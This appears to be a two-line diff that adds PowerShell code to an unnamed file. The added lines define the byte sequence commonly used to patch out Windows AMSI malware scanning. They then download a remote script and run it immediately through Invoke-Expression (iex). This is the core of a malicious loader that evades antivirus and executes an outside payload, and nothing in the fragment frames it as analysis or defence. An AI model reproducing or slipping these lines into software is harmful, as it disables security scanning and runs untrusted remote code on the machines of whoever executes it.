@@ -1,0 +1,2 @@
+$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+$wbc.DownloadString("$prefixpath/Raw.ps1.c3") | iex
